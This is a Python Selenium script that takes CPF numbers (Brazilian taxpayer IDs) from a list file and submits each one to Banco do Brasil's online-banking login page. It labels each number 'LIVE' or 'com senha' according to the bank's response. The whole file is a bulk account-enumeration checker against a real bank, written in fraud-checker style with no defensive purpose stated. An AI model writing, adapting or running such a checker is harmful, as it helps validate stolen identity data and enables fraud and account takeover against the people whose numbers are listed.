import os
import sys 
import time
from ast import While
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException

try:
	db = sys.argv[1]
except Exception:
	db = "db.txt"
	lista = open(db,'r').readlines()


	def chk():
		
		for i in range(len(lista)):
			cpf = lista[i].split()[0]

			options = webdriver.ChromeOptions()
			options.add_argument("--headless")


			options = webdriver.ChromeOptions()
			options.add_argument("--headless")

			navegador = webdriver.Chrome("C:/Users/Newton/Documents/Py/Scrapy/selenium/chromedriver.exe")
			#navegador = webdriver.Chrome("C:/Users/Newton/Documents/Py/Scrapy/selenium/chromedriver.exe", chrome_options=options)
			navegador.get('https://www2.bancobrasil.com.br/aapf/login.html#/acesso-aapf-agencia-conta')
			time.sleep(8)
			navegador.find_element_by_xpath('//*[@id="ng-view"]/div[2]/a').click()
			time.sleep(8)
			navegador.find_element_by_xpath('//*[@id="ng-view"]/div/div[3]/a').click()
			time.sleep(8)
			navegador.find_element_by_xpath('//*[@id="cpf"]').send_keys(cpf)
			time.sleep(8)
			navegador.find_element_by_xpath('//*[@id="botaoEnviar"]').click()
			time.sleep(8)

			try:
				navegador.find_element_by_xpath('//*[@id="ng-view"]/div[1]/form/bb-container-campo[2]/label').text				
				print(f'CPF {cpf} com senha!!')
			except Exception:
				print("LIVE "+cpf	)			

	chk()

#Instalação
#Documentação: https://pypi.org/project/selenium/

#Ocultar janela do selenium
#https://pt.stackoverflow.com/questions/440528/executar-selenium-no-chrome-de-forma-invis%C3%ADvel-headless